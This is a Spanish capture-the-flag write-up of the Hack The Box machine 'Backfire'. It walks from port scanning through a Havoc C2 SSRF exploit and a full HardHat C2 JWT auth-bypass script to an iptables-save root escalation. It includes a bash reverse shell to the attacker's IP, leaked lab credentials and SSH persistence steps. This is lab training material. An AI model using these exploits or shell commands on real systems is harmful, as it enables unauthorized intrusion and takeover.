---
title: Backfire - Hackthebox - Season7
date: 2025-01-22 18:41:00
categories: [Labs & CTF, Write Up, Hackthebox]
tags: [Linux, Havoc, JWT, CTF] 
image:
  path: /assets/img/posts/backfire-hackthebox/cabecera.png
  alt: Backfire Hackthebox
description: >
  Hackthebox backfire Guia en español
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

### Nmap

```bash
nmap -p- -sCV -sS -n -Pn --open 10.10.11.49
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 18:41 CET
Nmap scan report for 10.10.11.49
Host is up (0.16s latency).
Not shown: 65530 closed tcp ports (reset), 2 filtered tcp ports (port-unreach)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open  ssl/http nginx 1.22.1
|_http-server-header: nginx/1.22.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=ACME CO/stateOrProvinceName=Washington/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2024-10-10T14:36:13
|_Not valid after:  2027-10-10T14:36:13
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
8000/tcp open  http     nginx 1.22.1
|_http-title: Index of /
|_http-server-header: nginx/1.22.1
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Basado en los resultados del escaneo nmap, podemos ver que la máquina objetivo ejecuta un servidor SSH (puerto 22), un servidor HTTPS (puerto 443) y un servidor HTTP (puerto 8000). 

1. Puerto 8000: Tiene dos archivos interesantes:
   - disable_tls.patch
   - havoc.yaotl

2. Puerto 443: Servidor HTTPS nginx
   - Certificado SSL para 127.0.0.1
   - Devuelve 404 Not Found

### Descargar archivos

```bash
wget http://10.10.11.49:8000/disable_tls.patch
```

```bash
wget http://10.10.11.49:8000/havoc.yaotl
```
### Contenido de los archivos

[![disable_tls.patch](/assets/img/posts/backfire-hackthebox/disable_tls.patch_1.png)](/assets/img/posts/backfire-hackthebox/disable_tls.patch_1.png)

[![havoc.yaotl](/assets/img/posts/backfire-hackthebox/havoc.yaotl_1.png)](/assets/img/posts/backfire-hackthebox/havoc.yaotl_1.png)

El archivo havoc.yaotl muestra configuración de un Havoc C2 con:

1. Credenciales de dos usuarios:
- ilya:CobaltStr1keSuckz!
- sergej:1w4nt2sw1tch2h4rdh4tc2

2. Puerto de gestión 40056 que acepta conexiones locales.

El archivo disable_tls.patch indica que el puerto de gestión 40056 tiene TLS deshabilitado y usa SSH forwarding.

3. Havoc detalles de configuración:
- Host: 127.0.0.1
- Port: 40056
- Listener Ports: 8443

## Explotación de Havoc

Mediante un poco de busqueda podemos encontrar algunas de las últimas vulnerabilidades de Havoc.

Encontramos un PoC SSRF (CVE-2024-41570) que permite realizar una redirección de puerto a un servicio remoto.

[Github](https://gist.github.com/pich4ya/bda16a3b2104bea411612f20d536174b)

### Análisis de código

```python
decrypt()      # Descifra datos usando AES en modo contador
encrypt()      # Cifra datos usando AES en modo contador
int_to_bytes() # Convierte enteros a bytes
```

```python
register_agent()         # Gestiona el registro de agentes
open_socket()           # Establece conexión con el teamserver
write_socket()          # Envía datos al socket
read_socket()           # Recibe datos del socket
build_websocket_frame() # Construye frames WebSocket enmascarados
generate_sha3_256()     # Genera hashes SHA3-256
```

### Flujo de ejecución

1. **Inicialización**
   - Configura variables esenciales (`magic`, `teamserver_listener_url`, `headers`)
   - Establece parámetros de identidad (`agent_id`)
   - Inicializa claves criptográficas (`AES_Key`, `AES_IV`)

2. **Establecimiento de conexión**
   - Registra el agente usando `register_agent()`
   - Abre socket al teamserver con `open_socket()`
   - Construye y envía payload JSON para login C2

3. **Configuración del shell reverso**
   - Genera nombre de servicio y puerto aleatorios
   - Construye payload JSON para el servicio
   - Envía configuración mediante WebSocket frame

4. **Ejecución de comandos**
   - Prepara payload de inyección
   - Envía mediante WebSocket frame
   - Recibe y procesa respuesta del servidor


### Ejecución del PoC

```bash
python3 ssrf_poc.py -t https://10.10.11.49 -l 10.10.16.71 -c2user ilya -c2pass CobaltStr1keSuckz!
```

[![SSRF PoC](/assets/img/posts/backfire-hackthebox/poc_shell.png)](/assets/img/posts/backfire-hackthebox/poc_shell.png)

### Establecer persistencia SSH

#### En la maquina del servidor

```bash
ssh-keygen -t ed25519

cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
```
#### En la maquina del cliente

```bash
nano ~/.ssh/backfire_key

chmod 600 ~/.ssh/backfire_key

ssh -i ~/.ssh/backfire_key ilya@10.10.11.49
```

[![SSH Persistence](/assets/img/posts/backfire-hackthebox/ssh_key_gen.png)](/assets/img/posts/backfire-hackthebox/ssh_key_gen.png)

[![SSH Persistence](/assets/img/posts/backfire-hackthebox/ssh_key_conn.png)](/assets/img/posts/backfire-hackthebox/ssh_key_conn.png)

## User Flag

[![Flag](/assets/img/posts/backfire-hackthebox/user_flag.png)](/assets/img/posts/backfire-hackthebox/user_flag.png)

## Local Port Forwarding

[![searching](/assets/img/posts/backfire-hackthebox/searching.png)](/assets/img/posts/backfire-hackthebox/searching.png)

Si buscamos que documentos hay por aquí vemos uno llamado hardhat.txt que parece indicar la existencia de un servicio local que está en pruebas, vamos a ver si podemos acceder a él.

[![servicios](/assets/img/posts/backfire-hackthebox/servicios.png)](/assets/img/posts/backfire-hackthebox/servicios.png)

Podemos ver varios puertos abierto, el 5000 y el 7096 que pueden ser los usados por HardHatC2.

Vamos a redigir estos puertos en nuestra máquina linux para que podamos acceder a ellos.

```bash
ssh -L 7096:127.0.1.1:7096 -L 5000:127.0.1.1:5000 ilya@backfire.htb -i backfire_key 
```
[![Interfaz web](/assets/img/posts/backfire-hackthebox/red_web.png)](/assets/img/posts/backfire-hackthebox/red_web.png)

Ahora que tenemos acceso a la interfaz web podemos ver si tenemos permisos para acceder a HardHatC2.

### Interfaz HardHatC2

HardHat C2 es un framework de Command & Control (C2) diseñado como una alternativa a herramientas como Cobalt Strike. 

Para acceder a los controles de HardHatC2 debemos autenticarnos pero tras intentar las credenciales encontradas antes en serj e ilya, no nos permite entrar.

Tras un poco de búsqueda en internet descubrimos que HardHatC2 usa un sistema de tokens JWT para autenticarnos, y sabiendo esto podemos buscar algún PoC para explotarlo.

### Explotación JWT para HardHatC2 

#### Análisis del Exploit para HardHat C2

Este script explota una vulnerabilidad en la aplicación web HardHat C2 mediante la generación de un JWT (JSON Web Token) malicioso para crear un usuario administrador.

[JWT PoC](https://github.com/thisisveryfunny/HardHat-C2-Auth-Bypass/blob/main/auth_bypass.py)

##### Configuración Inicial
```python
rhost = '127.0.0.1:5000'
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
```
- Define el host objetivo y la clave secreta del JWT
- Establece el emisor del token

##### Generación del JWT
```python
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}
```
- Crea un payload con privilegios de administrador
- Establece una fecha de expiración de 28 días
- Incluye claims específicos para autenticación

##### Creación de Usuario
```python
burp0_url = f"https://{rhost}/Login/Register"
burp0_json = {
  "password": "caden64",
  "role": "TeamLead",
  "username": "caden64"
}
```
- Usa el JWT generado para crear un nuevo usuario
- Establece el rol como "TeamLead"
- Define credenciales para el nuevo usuario

#### Ejemplo 

```bash
import jwt
import datetime
import uuid
import requests

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "caden64",
  "role": "TeamLead",
  "username": "caden64"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

[![login](/assets/img/posts/backfire-hackthebox/login.png)](/assets/img/posts/backfire-hackthebox/login.png)


## Ganando acceso al usuario serj

Para poder acceder al usuario serj, debemos añadir la ssh key al usuario serj.

En la interfaz web de HardHatC2, en una de las secciones podremos ir a la ejecución de comandos.

Aquí vamos a crear una shell reversa a nuestra maquina para poder trabajar con el usuario serj.

```bash
nohup /bin/bash -i >& /dev/tcp/10.10.16.71/9000 0>&1 &
```

> **Nota**: Recuerda habilitar el puerto de escucha en tu máquina linux.
{: .prompt-info }

[![SHELL](/assets/img/posts/backfire-hackthebox/revshell_serj.png)](/assets/img/posts/backfire-hackthebox/revshell_serj.png)

Ahora seguimos el mismo proceso que para crear la clave ssh de ilya pero para serj.

[![ssh key](/assets/img/posts/backfire-hackthebox/serjrsa.png)](/assets/img/posts/backfire-hackthebox/serjrsa.png)

Con la clave importada tanto en el servidor como en nuestra maquina ahora si podemos acceder por ssh al usuario serj.

```bash
ssh -i ~/.ssh/backfire_key_serj sergej@10.10.11.49
```

## Escalado de privilegios

### Análisis de permisos sudo

Descubrimos que tenemos permisos de sudo para ejecutar comandos de iptables. Esto será clave para nuestra escalada de privilegios.

```bash
sudo -l
```
[![SUDO](/assets/img/posts/backfire-hackthebox/sudo_serj.png)](/assets/img/posts/backfire-hackthebox/sudo_serj.png)

### Insertar clave SSH en iptables

Usamos el campo "comment" de iptables para insertar nuestra clave SSH pública:

```bash
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<contenido de ssh-ed25519.pub>\n'
```

### Verificación

```bash
sudo /usr/sbin/iptables -S | grep "ssh-ed25519"
```

[![IPTABLES](/assets/img/posts/backfire-hackthebox/iptables_serj.png)](/assets/img/posts/backfire-hackthebox/iptables_serj.png)

### Explotación de iptables-save

Aprovechamos que podemos ejecutar iptables-save como root para escribir en el directorio de root:

```bash
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

Este comando guardará todas las reglas de iptables, incluyendo nuestro comentario con la clave SSH, en el archivo authorized_keys de root.

### Acceso root

Finalmente, usamos nuestra clave privada para conectarnos como root

```bash
ssh -i id_rsa root@localhost
```


[![root](/assets/img/posts/backfire-hackthebox/root_serj.png)](/assets/img/posts/backfire-hackthebox/root_serj.png)

#### Esta escalada de privilegios es posible porque:

1. **Tenemos permisos sudo sobre iptables**
    - El usuario tiene permisos para ejecutar iptables con privilegios de root a través de sudo, lo que es relativamente común en tareas de administración de red.

2. **Podemos escribir en archivos como root usando iptables-save**
    - Guarda la configuración actual de iptables en archivos
    - Preserva los comentarios al realizar el guardado
    - Se ejecuta con privilegios elevados
    - Puede escribir en cualquier ubicación del sistema

3. **El formato de authorized_keys acepta la clave SSH aunque venga con texto adicional**
    - Acepta claves SSH incluso si contienen texto adicional
    - No valida estrictamente el formato mientras la clave sea válida
    - Permite que la clave funcione aunque esté rodeada de otro contenido